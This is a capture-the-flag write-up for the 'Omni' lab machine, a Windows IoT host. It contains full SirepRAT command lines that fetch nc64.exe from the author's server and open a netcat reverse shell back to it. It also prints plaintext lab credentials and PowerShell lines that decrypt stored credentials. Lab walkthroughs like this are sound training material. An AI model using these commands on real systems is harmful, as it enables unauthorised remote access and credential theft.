# Omni

> Ip: 10.10.10.204
> Difficulty: Easy
> OS: ?

So let's first nmap this (-A -sC -sV) and apparently this is a Windows based OS, from here i've deep down a lil bit with the information i was given and after a few research I found out that it could be an IoT object, let me explain:
I've been given this: `basic realm: Windows Device Portal` and after a few research in the doc the "IoT" subject is really linked to it.

## Get a foothold

As i know what my box is, let's try to get in, with the following [tool](https://github.com/SafeBreach-Labs/SirepRAT), I'll be able to do stg ;)
Following the doc I can simply upload a file, so let's upload a nc64.exe on the remote!
(Do the usual: create a webserver, upload nc with SirepRAT and trigger it with SirepRAT again)

```py
### Upload on the IoT object
python2 ../SirepRAT/SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c powershell Invoke-WebRequest -OutFile C:\\Windows\\System32\\nc64.exe -Uri http://10.10.14.236:8000/nc64.exe"
### trigger nc64.exe
python2 ../SirepRAT/SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c C:\Windows\System32\nc64.exe 10.10.14.236 1337 -e powershell.exe" --v
```

## Find the user.txt  

After checking the $env:path we find different things and you can go to the PowerShell folder, so we can go in it and do a `ls -force` (the same as ls -a for UNIX) and then `type r.bat` (eq. to cat for UNIX )  
And there is this in:  

"""
net user app mesh5143
net user administrator _1nt3rn37ofTh1nGz
"""

## Back to the website

We can remember a web server on the 8080 port so let's have a check as it was password protected and type the app with his creds.  
Under process>Execute Command and then from here you can trigger the nc64.exe (on a different port as we want to keep the other one) and boom we've a powershell as "App"  
Let's type $HOME to get his home, and then from here you can just read user.txt  
But wait ....

## Encryption

And shit it is encrypted, but it doesn't seems really hard to determine the encryption type.  
After a few googling, we can find what is it: [Info](https://devblogs.microsoft.com/scripting/decrypt-powershell-secure-string-password/)  

So apparently you just have to get the xml and extract the password from it so let's go:

```bat
$credentials=Import-CliXml -Path C:\Data\Users\app\user.txt  
$credentials.GetNetworkCredential().Password
```

## Root.txt

And sad things, the root.txt is attainable the exact same way as the app!  
Use the creds we get in the r.bat, connect with admin, do the exact same thing, and boom !
